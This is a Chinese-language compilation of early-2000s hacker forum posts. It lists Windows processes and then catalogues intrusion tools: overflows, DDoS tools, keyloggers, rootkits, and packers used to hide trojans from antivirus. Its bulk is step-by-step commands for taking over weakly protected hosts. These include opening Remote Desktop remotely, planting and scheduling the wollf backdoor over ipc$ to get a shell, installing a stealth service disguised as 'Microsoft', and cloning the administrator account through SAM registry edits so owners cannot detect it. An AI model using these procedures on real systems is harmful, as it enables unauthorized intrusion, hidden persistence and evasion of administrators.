lsass.exe 管理 IP 安全策略以及启动 ISAKMP/Oakley (IKE) 和 IP 安全驱动程序。(系统服务) 产生会话密钥以及授予用于交互式客户/服务器验证的服务凭据(ticket)。(系统服务) ->netlogon 
svchost.exe 包含很多系统服务 !!!->eventsystem, 
(SPOOLSV.EXE 将文件加载到内存中以便迟后打印。) 
explorer.exe 资源管理器 
(internat.exe 托盘区的拼音图标) 


附加的系统进程（这些进程不是必要的，你可以根据需要通过服务管理器来增加或减少） 

mstask.exe 允许程序在指定时间运行。(系统服务)->schedule 
regsvc.exe 允许远程注册表操作。(系统服务)->remoteregister 
winmgmt.exe 提供系统管理信息(系统服务)。 
inetinfo.exe->msftpsvc,w3svc,iisadmn 
tlntsvr.exe->tlnrsvr 
tftpd.exe 实现 TFTP Internet 标准。该标准不要求用户名和密码。远程安装服务的一部分。(系统服务) 
termsrv.exe ->termservice 
dns.exe 应答对域名系统(DNS)名称的查询和更新请求。(系统服务) 


以下全是系统服务,并且很少会用到，如果你暂时用不着,应该关掉(对安全有害 ) 

tcpsvcs.exe 提供在 PXE 可远程启动客户计算机上远程安装 Windows 2000 Professional 的能力。(系统服务)->simptcp 
支持以下 TCP/IP 服务：Character Generator, Daytime, Discard, Echo, 以及 Quote of the Day。(系统服务) 
ismserv.exe 允许在 Windows Advanced Server 站点间发送和接收消息。(系统服务) 
ups.exe 管理连接到计算机的不间断电源(UPS)。(系统服务) 
wins.exe 为注册和解析 NetBIOS 型名称的 TCP/IP 客户提供 NetBIOS 名称服务。(系统服务) 
llssrv.exe License Logging Service(system service) 
ntfrs.exe 在多个服务器间维护文件目录内容的文件同步。(系统服务) 
RsSub.exe 控制用来远程储存数据的媒体。(系统服务) 
locator.exe 管理 RPC 名称服务数据库.->rpclocator(区 RpcSs) 
lserver.exe 注册客户端许可证。(系统服务) 
dfssvc.exe 管理分布于局域网或广域网的逻辑卷。(系统服务) 
clipsrv.exe 支持“剪贴簿查看器”，以便可以从远程剪贴簿查阅剪贴页面。(系统服务) 
msdtc.exe 并列事务，是分布于两个以上的数据库，消息队列，文件系统，或其它事务保护资源管理器。(系统服务) 
faxsvc.exe 帮助您发送和接收传真。(系统服务) 
cisvc.exe Indexing Service(system service)!!! 
dmadmin.exe 磁盘管理请求的系统管理服务。(系统服务) 
mnmsrvc.exe 允许有权限的用户使用 NetMeeting 远程访问 Windows 桌面。(系统服务) 
netdde.exe 提供动态数据交换 (DDE) 的网络传输和安全特性。(系统服务) 
smlogsvc.exe 配置性能日志和警报。(系统服务) 
rsvp.exe 为依赖质量服务(QoS)的程序和控制应用程序提供网络信号和本地通信控制安装功能。(系统服务) 
RsEng.exe 协调用来储存不常用数据的服务和管理工具。(系统服务) 
RsFsa.exe 管理远程储存的文件的操作。(系统服务) 
grovel.exe 扫描零备份存储(SIS)卷上的重复文件，并且将重复文件指向一个数据存储点，以节省磁盘空间。(系统服务) 
SCardSvr.exe 对插入在计算机智能卡阅读器中的智能卡进行管理和访问控制。(系统服务) 
snmp.exe 包含代理程序可以监视网络设备的活动并且向网络控制台工作站汇报。(系统服务) 
snmptrap.exe 接收由本地或远程 SNMP 代理程序产生的陷阱消息，然后将消息传递到运行在这台计算机上 SNMP 管理程序。(系统服务) 
UtilMan.exe 从一个窗口中启动和配置辅助工具。(系统服务) 
msiexec.exe 依据 .MSI 文件中包含的命令来安装、修复以及删除软件。(系统服务) 


【不显示用户登陆帐号】
运行regedit，找到 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\winlogon 
项中的Dont Display Last User Name串数据改成1，这样系统不会自动显示上次的登录用户名。

【了解黑客经常使用哪些工具】
webadv：针对iis+sp3的溢出成功率很高(溢出后system权限!) 

　　ipscan：大范围网段快速ipc猜解 

　　svc：远程安装/删除Win2k服务 

　　3389.vbs：远程安装Win2k终端服务不需i386 

　　arpsniffer：arp环境sniffer(需要Winpcap2.1以上) 

　　ascii：查询字符和数字ascii码(常用来对url编码用以躲避ids或脚本过滤) 

　　ca：远程克隆账号 

　　cca：检查是否有克隆账号 

　　cgi-backdoor：几个cgi木马(十多种利用最新漏洞的web脚本后门，涵盖jsp,php,asp,cgi等等) 

　　crackvnc：远程/本地破解Winvnc密码(本地破用-W参数) 

　　pass.dic：密码字典 

　　debploit：Win2k+sp2配置最佳权限提升工具 

　　fpipe：端口重定向工具 

　　fscan：superscan命令行版本(可定义扫描时的源端口并支持udp端口扫描) 

　　hgod04：ddos攻击器 

　　idahack：ida溢出 

　　idq.dll：利用isapi漏洞提升权限(对sp0+sp1+sp2都非常有效，也是很棒的web后门) 

　　IIS：idq溢出 

　　inst.zip：指定程序安装为Win2k服务 

　　ip_mail.rar：发送主机动态IP的软件 

　　ipc.vbs：不依赖ipc$给远程主机开telnet 

　　ispc.exe：idq.dll连接客户端 

　　Keyghost.zip：正版键盘记录器 

　　log.vbs：日志清除器(远程清除不依赖ipc$) 

　　md5.pl：论坛md5加密密码破解器 

　　msadc.pl：Winnt的msadc漏洞溢出器

　　MsSqlHack：mssql溢出程序

　　mysql-client：mysql客户端 

　　Name.dic：最常用的中国人用户名(看看你常用的用户名在不在里面) 

　　PassSniffer：大小仅3kb的非交换机sniffer软件 

　　psexec：通过ipc管道直接登录主机 

　　pskill：杀进程高手:) 

　　pslist：列进程高手:) 

　　rar：命令行下的中文版Winrar(功能相当全面) 

　　reboot.vbs：远程重启主机的脚本 

　　sdemo.zip：巨好的屏幕拍摄的录像软件 

　　shed：远程查找Win9x的共享资源 

　　sid：用sid列用户名 

　　SkServerGUI：snake多重代理软件 

　　SkSockServer：snake代理程序 

　　SMBCrack：超快的ipc破解软件（适合破一台机) 

　　socks：利用这工具安装木马，即使网关重新低格硬盘木马也在嘿嘿 

　　SocksCap：把socks5代理转化为万能代理 

　　SPC.zip：可以直接显示出远程Win98共享资源密码的东东

　　WMIhack：基于WMI服务进行账号密码的东东(不需要ipc) 

　　skmontor：snake的注册表监视器（特酷的) 

　　sql1.exe：mssql溢出程序2 

　　sql2.exe：mssql溢出程序3 

　　SqlExec：mssql客户端 

　　SuperScan：GUI界面的优秀扫描器 

　　syn：syn攻击第一高手 

　　upx120：特好的压缩软件，常用来压缩木马躲避杀毒软件 

　　wget：命令行下的http下载软件 

　　Win2kPass2：Win2k的密码大盗 

　　Winnuke：攻击rpc服务的软件(Win2ksp0/1/2/3+Winnt+Winxp系统不稳定) 

　　smbnuke：攻击netbios的软件(Win2ksp0/1/2/3+Winnt+Winxp系统死机) 

　　WinPcap_2_3：nmap,arpsniffer等等都要用这个 

　　WinPcap_2_3_nogui.exe：无安装界面自动安装的WinPcap_2_3（命令行版) 

　　scanbaby2.0：能对80%的mail服务利用漏洞列账号密码破解(超酷哦，去看rfc里有mail弱点说明) 

　　SuperDic_V31：非常全面的黑客字典生成器 

　　Getadmin：Win2k+sp3配置的权限提升程序(不错!!!) 

　　whoami：了理自己的权限 

　　FsSniffer：巨好的非交换机sniffer工具 

　　twwwscan：命令行下巨好的cgi扫描器 

　　TFTPD32：给远方开tftp服务的主机传文件(当然要有个shell) 

　　RangeScan：自定义cgi漏洞的GUI扫描器 

　　pwdump2：本地抓Winnt/2k密码散列值(不可缺) 

　　pwdump3：远程抓Winnt/2k密码散列值(不可缺) 

　　procexpnt：查看系统进程与端口关联(GUI界面) 

　　nc：已经不是简单的telnet客户端了 

    CMD.txt：有什么cmd命令不懂就查查它 

　　fport：命令行下查看系统进程与端口关联(没有GUI界面的procexpnt强) 

　　BrutusA2：全功能的密码破解软件,支持telnet,ftp,http等服务的口令破解 

　　cmd.reg：文件名自动补全的reg文件(命令行:按TAB键自动把sys补全为system,再按一次就变为system32) 

　　regshell：命令行下的注册表编辑器 

　　nscopy：备份员工具(当你是Backup Operators组的用户时有时你的权限会比admin还大) 

　　session.rar：有了Win/nt2000目标主机的密码散列值,就可以直接发送散列值给主机而登录主机 

　　klogger.exe：一个几kb的击键记录工具,运行后会在当前目录生成KLOGGER.TXT文件 

　　smb2：发动smb的中间人MITM攻击的工具，在session中插入自己的执行命令 

　　xptsc.rar：Winxp的远程终端客户端(支持Win2000/xp) 

　　SQLhack.zip：相当快的mssql密码暴力破解器 

　　mssql：相当快的mssql密码暴力破解器 

　　ntcrack.zip：利用获取到的MD4 passwd hash破解帐号密码 

　　SQLSniffer.rar：MSsql的密码明文嗅探器 

　　TelnetHack.rar：在拥有管理员权限的条件下，远程打开Win2000机器的Telnet服务 

　　RFPortXP.exe：XP下关联端口与进程的程序 

　　SQLTools.rar：mssql工具包 

　　ServiceApp.exe：远程安装/删除服务 

　　hgod：具有SYN/DrDos/UDP/ICMP/IGMP拒绝服务测试功能的选项 

　　hscan：小型综合扫描器(支持cisco,mysql,mssql,cgi,rpc,ipc(sid),ftp,ssh,smtp等等相当全面) 

　　HDoor.rar：ping后门(icmp后门) 

　　SIDUserEnum.exe：利用sid得到用户列表(小榕的那个sid有时不能完全列举出来) 

　　RPC_LE.exe：利用rpc溢出使Win2k重启(对sp3+sp4hotfix有效) 

　　r3389.exe：查询Terminal Server更改后的端口（1秒内） 

　　smbsniffer.exe：获取访问本地主机网页的主机散列值(支持截获内网主机散列) 

　　NetEnum.exe：通过3389端口+空连接获取对方主机大量信息 

　　aspcode.exe：经测试最有效的asp溢出程序第二版(对sp2有效) 

　　sslproxy：针对使用ssl加密协议的代理（扫描器通过它就可以扫描ssl主机了!!!!) 

　　lsa2：在lsa注册表键里获取Winnt/2k的明文密码包括sqlserver的(打了补丁就没用了) 

　　psu.exe：用指定进程的权限打开指定的程序 

　　ldap.msi：ldap 轻量级目录服务客户端,通过389端口获取主机大量信息如账号列表 

　　rootkit：从系统底层完美隐藏指定进程，服务，注册表I并可以端口绑定的内核级Win2k后门!!! 

【五种办法开启3389终端】
五种办法开启3389终端
http://www.cnwill.com   
 


本文作者： ibicP 文章录入：safer
文章出处： 黑客防线技术论坛 
阅读次数： 390
发布日期： 2003-9-11 
第一种方法：
使用的工具:
1:ipcscan扫描器
2:终端服务连接工具xpts.exe(WIN 2000/XP 终端连接程序. 内附有COPY 文件的补丁. 格式 IP:Port )
3:开终端的脚本rots.vbs(灰色轨迹zzzevazzz的作品)
4:cscript (在system32文件夹下;98操作系统可能没有
二:步骤:
1:用ipcscan扫描弱口令(你们可以自己扫,我也扫到一些弱口令主机.演实时间我在论坛上再发) 
2:用rots.vbs开启终端服务
说明 cscript ROTS.vbs <目标IP> <用户名> <密码> [服务端口] [自动重起选项]
格式 cscript.exe rots.vbs ip user userpass port /r
或者 cscript.exe rots.vbs ip user userpass port /fr
三:常见问题:
1:脚本会判断目标系统类型,如果不是server及以上版本,就会提示你是否要取消。因为pro版不能安装终端服务.如果你确信脚本判断错误,就继续安装好了.
2:可能会出现:Conneting 202.202.202.202 ....Error0x80070776 .Error description: 没有发现指定的此对象导出者,这个还是放弃吧. 
3:可能会连接不上,请用这个格式127.0.0.1:1818 1818是刚才开的端口.

第二种方法：
进入后：TELNET上去！
c:\>echo [Components] > c:\rock 
c:\>echo TSEnable = on >> c:\rock 
c:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\rock /q 
或者！ 
c:\>echo [Components] > d:\wawa 
c:\>echo TSEnable = on >> d:\wawa 
c:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:d:\wawa /q 
等会自动启后就OK
或者：
在本地利用DOS命令edit建立.bat后缀批处理文件（文件名随意） echo [Components] > c:\sql
echo TSEnable = on >> 
c:\sqlsysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\sql /q
net use \\ip地址\ipc$ 密码 /user:用户名（一般默认:administrator)
利用at time 获取对方服务器时间。
copy 路径:\xxx.bat \\ip地址\$c:\winnt
at time 00:00:00 xxx.bat
服务器执行命令后，服务器将重新启动，利用3389登陆就OK了！

第三种方法：
进入后,再次检查终端组件是否安装: 
c:\>query user 
这个工具需要安装终端服务. 
这样就进一步确定了组件没有被安装.如果返回: 
USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME 
>w1 console 0 运行中 . 2002-1-12 22:5 
\\类似这样的信息,可能组件就已安装. 
好!都清楚了,可以开始安装了. 
--------------------------------------------------- 
C:\>dir c:\sysoc.inf /s //检查INF文件的位置 
c:\WINNT\inf 的目录 
2000-01-10 20:00 3,770 sysoc.inf 
1 个文件 3,770 字节 
----------------------------------------------------- 
C:\> dir c:\sysocmgr.* /s //检查组件安装程序 
c:\WINNT\system32 的目录 
2000-01-10 20:00 42,768 sysocmgr.exe 
1 个文件 42,768 字节 
----------------------------------------------------- 
c:\>echo [Components] > c:\rock 
c:\>echo TSEnable = on >> c:\rock 
//这是建立无人参与的安装参数 
c:\>type c:\rock 
[Components] 
TSEnable = on 
//检查参数文件 
------------------------------------------------------ 
c:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\rock /q 
----------------------------------------------------- 
这一条就是真正安装组件的命令. 
以上这条命令没有加/R参数,主机在安装完后自动重起. 
如若加了/R参数主机就不会重起. 
如果一切正常的话,几分钟后对方主机将会离线,当它重新回来时, 
3389终端服务就已经开启.你就可以连上去了. 
问题和建议: 
A 在安装过程中,不使用/R,有时主机也不会重起,你就要手动重起他,但在使用诸如:iisreset /reboot命令时,对方 
的屏幕会出现个对话框,写着谁引起的这次启动,离重起还有多少秒. 
B 一次不行可以再试一次,在实际中很有作用. 
C 在输入sysocmgr命令开始安装时,一定不要把命令参数输错,那会在对方出现一个大的对话框,是sysocmgr的帮助,很是显眼, 
而且要求确定.在你的屏幕上是不会有任何反应的,你不会知道出错，所以会有B的建议. 

第四种方法：
C:\Documents and Settings\shanlu.XZGJDOMAIN>net use \\218.22.155.*\ipc$ "" /us 
er:administrator----------------连接成功！ 
命令成功完成。 
C:\Documents and Settings\shanlu.XZGJDOMAIN>copy wollf.exe \\218.22.155.*\admi 
n$------------------------------拷贝wollf.exe到目标计算机的admin$目录 
已复制 1 个文件。 
C:\Documents and Settings\shanlu.XZGJDOMAIN>copy hbulot.exe \\218.22.155.*\adm 
in$-----------------------------拷贝hbulot.exe到目标计算机的admin$目录 
已复制 1 个文件。 
C:\Documents and Settings\shanlu.XZGJDOMAIN>net time \\218.22.155.* 
\\218.22.155.* 的当前时间是 2002/12/1 上午 06:37 
命令成功完成。 
C:\Documents and Settings\shanlu.XZGJDOMAIN>at \\218.22.155.* 06:39 wollf.exe 
新加了一项作业，其作业 ID = 1--指定wollf.exe在06:39运行 
------------------------------------------------------------------------------------------ 
说明： 
wollf.exe是一个后门程序，很多高手都喜欢nc或者winshell，不过我对他情有独钟！在这里我只介绍与本文内 
容有关的命令参数，它的高级用法不做补充。 
hbulot.exe是用于开启3389服务，如果不是server及以上版本，就不要运行了。因为pro版不能安装终端服务。 
2分钟后...... 
------------------------------------------------------------------------------------------ 
C:\Documents and Settings\shanlu.XZGJDOMAIN>wollf -connect 218.22.155.* 7614 
"Wollf Remote Manager" v1.6 
Code by wollf, http://www.xfocus.org 
------------------------------------------------------------------------------------------ 
说明： 
使用wollf连接时要注意wollf.exe要在当前目录，它的连接命令格式：wollf -connect IP 7614 
7614是wollf开放的端口。如果显示如上，说明你已经连接成功，并具有管理员administrator权限。 
------------------------------------------------------------------------------------------ 
[server@D:\WINNT\system32]#dos 
Microsoft Windows 2000 [Version 5.00.2195] 
(C) 版权所有 1985-2000 Microsoft Corp. 
------------------------------------------------------------------------------------------ 
说明： 
输入dos,你就会进入目标机的cmd下，这时同样具有administrator权限。 
------------------------------------------------------------------------------------------ 
D:\WINNT\system32>cd.. 
cd.. 
D:\WINNT>dir h*.* 
dir h*.* 
驱动器 D 中的卷没有标签。 
卷的序列号是 1CE5-2615 
D:\WINNT 的目录 
2002-11-27 03:07 <DIR> Help 
2002-09-10 12:16 10,752 hh.exe 
2002-10-01 08:29 24,576 HBULOT.exe 
2 个文件 35,328 字节 
1 个目录 9,049,604,096 可用字节 
D:\WINNT>hbulot 
hbulot 
------------------------------------------------------------------------------------------ 
说明： 
因为我们把HBULOT.exe放到目标机的admin$下的，所以先找到它，以上是文件的存放位置。 
D:\WINNT>exit 
exit 
Command "DOS" succeed. 
[server@D:\WINNT\system32]#reboot 
Command "REBOOT" succeed. 
[server@D:\WINNT\system32]# 
Connection closed. 
------------------------------------------------------------------------------------------ 
说明： 
由dos退到wollf的连接模式下用exit命令，HBULOT.exe运行后需重新启动方可生效，这里wollf自带的REBOOT 
命令，执行过在5秒后你就会失去连接。启动完毕后检查一下3389端口是否开放，方法很多，superscan3扫一下 

。这时候你就可以登陆了。如果没有开放3389那就不是server及以上版本，就不要运行了。因为pro版不能安装终端服务。 
到这里，你已经拥有3389肉鸡了！但是会不会被别的入侵者发现呢？下面所教的就是怎么让3389只为你服务！ 
我们现在使用的3389登陆器有两种版本，一种是2000/98，一种是XP。二者区别呢？前者使用的默认端口3389对 
目标，后者默认的也是3389端口，但是它还支持别的端口进行连接！所以呢......我们来修改3389的连接端口 
来躲过普通扫描器的扫描！修改方法如下： 
修改服务器端的端口设置 ，注册表有2个地方需要修改。 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] 
PortNumber值，默认是3389，修改成所希望的端口，比如1314 
第二个地方： 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]　 
PortNumber值，默认是3389，修改成所希望的端口，比如1314 
现在这样就可以了。重启系统吧。 
注意：事实上，只修改第二处也是可以的。另外，第二处的标准联结应该是 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\<connection> 
<connection>表示具体的某个RDP-TCP连结。 
重启过后，看看端口有没有改。 
小技巧：修改注册表键值时，先选择10进制，输入你希望的端口数值，再选择16进制，系统会自动转换。 


第五种方法：
一.原理性基本安装 
1.将如下注册表键值导入 "肉机" 的注册表中: 
------------- 
Windows Registry Editor Version 5.00 
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] 
"Enabled"="0" 
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] 
"ShutdownWithoutLogon"="0" 
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] 
"EnableAdminTSRemote"=dword:00000001 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] 
"TSEnabled"=dword:00000001 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] 
"Start"=dword:00000002 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService] 
"Start"=dword:00000002 
[HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] 
"Hotkey"="1" 
----------- 
2.重新起动"肉机"。 
3.使用本地的3398客户端，连接 "肉机" . 
4.优(缺)点: 
A."肉机"中 "控制面板-->添加/删除程序-->添加/删除 Windows 组件-->终端服务" 仍然处于未安装状态. 
B."肉机"中 "开始-->程序-->管理工具" 没有任何变动. 
C."肉机"中 "开始-->程序-->管理工具-->服务-->Terminal Services" 变为 "已起动" 和"自动". 
D."肉机"中 "Windows 任务管理器-->进程" 内,增加 "Termsrv.exe". 
5.与"sysocmgr /iysoc.inf /u:u.txt /q" 的比较: 
A."肉机"中 "控制面板-->添加/删除程序-->添加/删除 Windows 组件-->终端服务" 处于已安装状态. 
B."肉机"中 "开始-->程序-->管理工具" 增加 "终端服务管理器","终端服务配置" 和 "终端服务客户端生成器". 
C."肉机"中 "开始-->程序-->管理工具-->服务-->Terminal Services" 变为 "已起动" 和"自动". 
D."肉机"中 "Windows 任务管理器-->进程" 内,增加 "Termsrv.exe". 
E.需要拷贝几兆的文件到"肉机"中. 
二.抛砖引玉性"隐蔽"安装: 
1.将"肉机"中 "c:\winnt\system32\termsrv.exe" 文件作一备份,命名为"eventlog.exe",仍将其放入目录 "c:\winnt\system32\" 
2.将如下注册表键值导入 "肉机" 的注册表中: 
------------ 
Windows Registry Editor Version 5.00 
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] 
"Enabled"="0" 
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] 
"ShutdownWithoutLogon"="0" 
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] 
"EnableAdminTSRemote"=dword:00000001 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] 
"TSEnabled"=dword:00000001 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] 
"Start"=dword:00000002 
[HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] 
"Hotkey"="1" 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecuService] 
"Start"=dword:00000002 
"ErrorControl"=dword:00000001 
"ImagePath"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,\ 
74,00,25,00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,65,\ 
00,76,00,65,00,6e,00,74,00,6c,00,6f,00,67,00,2e,00,65,00,78,00,65,00,00,00 
"ObjectName"="LocalSystem" 
"Type"=dword:00000010 
"Description"="Microsoft" 
"DisplayName"="Microsoft" 
--------------- 
3.重新起动"肉机"。 
4.使用本地的3398客户端，连接“肉机”。 
5.优(缺)点: 
A."肉机"中 "控制面板-->添加/删除程序-->添加/删除 Windows 组件-->终端服务" 仍然处于未安装状态. 
B."肉机"中 "开始-->程序-->管理工具" 没有任何变动. 
C."肉机"中 "开始-->程序-->管理工具-->服务-->Terminal Services" 没有变化,保持原始状态. 
D."肉机"中 "开始-->程序-->管理工具-->服务" 增加 "Microsoft" 
E."肉机"中 "Windows 任务管理器-->进程" 内,增加 "eventlog.exe". 
三.理论简介 
如此简单? 只修改注册表? 不需要拷贝W2k源文件? 
让我们从一条命令行语句说起,这条语句是: "sysocmgr /iysoc.inf /u:u.txt /q" . 其中 u.txt 如下: 
------------- 
[Components] 
TsEnable = on 
------------- 
首先认识 "sysoc.inf"."sysoc.inf" 是安装信息文件,位于 "c:\winnt\inf". 打开它,在 "[Components]" 节,找到与 "终端服务" 有关的条目: 
"TerminalServices=TsOc.dll, HydraOc, TsOc.inf,,2" 
这里引出另外一个安装信息文件: "TsOc.inf". 这个文件同样位于 "c:\winnt\inf". 
打开这个文件,你会发现,如同 windows 环境下的软件安装, "终端服务" 的安装, 也主要由三个部分: 拷贝源文件,注册 DLL 以及修改注册表. 
在 [TerminalServices.FreshInstall] 节 和 "File Sections" 部分,你会发现 "终端服务" 所需的系统文件,DLL 和驱动, 随同 W2k 的初始安装,都已安然就位. 
为什么 "终端服务" 的常规安装和命令行安装都需要拷贝W2k源文件? 事实上,所拷贝的是"终端服务"客户端软件,既 "开始-->程序-->管理工具-->终端服务客户端生成器" 生成客户软盘需要的文件. 
各位 "黑友" 提供的包或工具,里面包括的W2k源文件,都是 "tsc32" 打头的. 关连 "TsOc.inf" 的 "File Sections" 部分和另外一个文件 "c:\winnt\inf\layout.inf",你将会得到证实. 
"终端服务"的安装,需要注册俩个 "DLL". 这俩个 "DLL" 同样早早就住在系统里,想必它们一定也有了身份证. 
"TsOc.inf" 文件一半的内容是关于修改注册表. 但"终端服务" 需要的"Reg.AddToFreshInstall, Reg.AddTo50, Reg.AddTo40" 都是在系统安装时注册过的. 
我们回头看一下那个命令行语句, "/u:" 参数后面的无人职守安装信息文件 "u.txt". "TsEnable = on" ? 
"TsOc.inf" 文件 [Optional Components] 节中有三个选项, "TerminalServices", "TSEnable" ,"TSClients". 
"TerminalServices" 如上所述,在系统初始安装时,已经就序. "TSClients" 与 "终端服务" 没有直接的关系. 
我们在 "TsOc.inf" 找到 "[TsEnable]" 节. 此节中有用的信息只有一条 "ToggleOnSection = TerminalServices.ToggleOn". 再转到 [TerminalServices.ToggleOn] 节. 
[TerminalServices.ToggleOn] 节告诉我们,下一站是 "Reg.ToggleOn", 沿着这个线索,我们来到 [Reg.ToggleOn]，OK了
 


【克隆admin！CA】
利用SA.exe 将Iusr_victim克隆为Administrator。 

C:\>ca \\192.168.0.1 test test iusr_victim password 
Clone Administrator, by netXeyes 2002/04/06 
Written by netXeyes 2002, dansnow@21cn.com 

Connect 192.168.0.1 ....OK 
Get SID of iusr_victim ....OK 
Prepairing ....OK 
Processing ....OK 
Clean Up ....OK 

这时，iusr_victim就成为了超级用户，并有具有和Administrator同样的设置(桌面、菜单等等）。 

注：在ca \\192.168.0.1 test test iusr_victim password 中， 
192.168.0.1是肉鸡的IP地址；第一个test是你已经得到的肉鸡上的管理员用户名，第二个test是这个用户名的密码；iusr_victim是你想克隆的帐号，最后这个password就是你想给iusr_victim用的密码。 
------------------------------------------------------- 

用CCA.EXE检查是否存在克隆的帐号。 
不必改变ACL, 支持远程检查。 
C:\>cca \\192.168.0.29 administrator 123456 
Check Clone Account, by netXeyes 2002/04/29 
Written by netXeyes 2002, dansnow@21cn.com 

Connect 192.168.0.29 ....OK 
Prepairing ....OK 
Processing ....OK 
Checking .... 

Check Result: 

[DuDu] AS SAME AS [administrator] 
[Guest] AS SAME AS [administrator] 
[IUSR_RONG] AS SAME AS [administrator] 
[IWAM_RONG] AS SAME AS [administrator] 
[TEST] AS SAME AS [administrator] 
[xr] AS SAME AS [administrator] 
[Guest] AS SAME AS [DuDu] 
[IUSR_RONG] AS SAME AS [DuDu] 
这上面的DuDu，guest，IUSR_RONG等帐户就已经是被克隆为administrator啦
注意删除克隆账户是小心一定注意。我试验过很多机子删除之后administrator账户不再超管组


其实可隆帐号就是利用命名管道来把sam文件重置一份，前提是要对方的netbios端口，NETBEUI协议都装了，而且ipc$,admin$都要开着~~
我记得还有在注册表下修改用户的SID也可以的，只要把所要可隆的帐号的SID改成已知的那个号的SID 具体自己到网上找~~
1，使用ca时，出现connect **.**.**.** ...Error是怎么会事？ 
答：ca和cca需要目标开放ipc$，请确认可以与目标建立ipc$。参见“关于ipc$和空连接” 
2，使用ca时，出现“Processing....ERROR”是怎么会事？ 
答：这说明对方主机缺少文件msvcp60.dll，想办法传个过去放在系统目录下就可以了。 
3，克隆过程没有错误，但cca没有显示该帐号克隆成功，无法使用被克隆的帐号。 
答：这一般是因为对方主机是域控制器，注册表中sam结构不同，工具失效。暂时无法解决。 
4，手动克隆无法访问注册表SAM键怎么办？ 
答：在命令行方式，可以使用psu工具获得SYSTEM权限，从而访问SAM键。详见上面说明。 
在图形界面，运行regedt32.exe，找到SAM键并选中。“安全”子菜单栏里有一项“权限”，打开它。在里面设 



【克隆帐号PSU和CA的用法】
二、克隆帐号

 

1...经常看到一些人在入侵一台Windows 2000或者Windows NT后堂而皇之地创建一个管理员组的用户，似乎当管理员不存在一般，今天偶违背一下偶以前的初衷，Share一个类似于RootKit的玩艺，当然，这些过程也是可以用脚本实现的，但是我就不写了，OK，Show Time Now。 

 

首先要让大家知道的概念是在Windows 2000和Windows NT里，默认管理员帐号的SID是固定的500（0x1f4），那么我们可以用机器里已经存在的一个帐号将SID为500的帐号进行克隆，在这里我们选择的帐号是IUSR_MachineName（当然，为了加强隐蔽性，我们选择了这个帐号，所有用户都可以用以下的方法，只不过这个用户较常见罢了），测试环境为Windows 2000 Server。 

 

运行一个System的CMD Shell( http://www.sometips.com/tips/scripts/173.htm 或使用 Http://www.sometips.com/soft/psu.exe)，然后在该CMD Shell里面运行 regedit /e adam.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 

 

这样我们将SID 为500的管理员帐号的相关信息导出，然后编辑adam.reg文件，将adam.reg文件的第三行--[HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4]最后的"1F4"修改为IUSR_MachineName的SID（大部分的机器该用户的SID都为0x3E9，如果机器在最初安装的时候没有安装IIS，而自己创建了帐号后再安装IIS就有可能不是这个值），将Root.reg文件中的"1F4"修改为"3E9"后执行 regedit /s adam.reg 导入该Reg文件 

 

然后运行 
net user IUSR_MachineName Sometips 

修改IUSR_MachineName的密码（最好使用14位的密码，越像IUSR_MachineName的密码越好） 

 

OK,大功告成... 

 

这样，我们拥有和默认管理员一样的桌面、一样的Profile..... 而且，当我们运行 net localgroup administrators 时，看看结果： 


C:\>net localgroup administrators 
Alias name administrators 
Comment Administrators have complete and unrestricted access to the computer/domain 

Members 

------------------------------------------------------------------------------- 
Administrator 
The command completed successfully. 
 

再看看USER2SID的输出结果： 


C:\>user2sid Administrator 

S-1-5-21-1004336348-1078145449-854245398-500 

Number of subauthorities is 5 
Domain is IDONTKNOW 
Length of SID in memory is 28 bytes 
Type of SID is SidTypeUser 

C:\>user2sid iusr_machinename 

S-1-5-21-1004336348-1078145449-854245398-1001 

Number of subauthorities is 5 
Domain is IDONTKNOW 
Length of SID in memory is 28 bytes 
Type of SID is SidTypeUser 
 

我想，再高明的管理员也看不到任何的异状了...而且，随便管理员改成什么密码，我照样可以用IUSR_MachineName，密码为Sometips登陆...(没有哪位大侠级的管理员喜欢经常修改IUSR_MachineName为其他的名字吧) 

 

很多人提到使用了管理工具的用户管理后，能够发现IUSR_MachineName被提升了权限。 

 

现给出解决办法。 

方法同上，不过这次修改内容多一些。即 

这次要导出两个key内容： 

一个是adam提到的 
regedit /e adam.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 

然后另外一个是你需要修改那个账号的值 
regedit /e iusr.reg HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003E9 

 

然后按照adam提到的修改adam.reg 
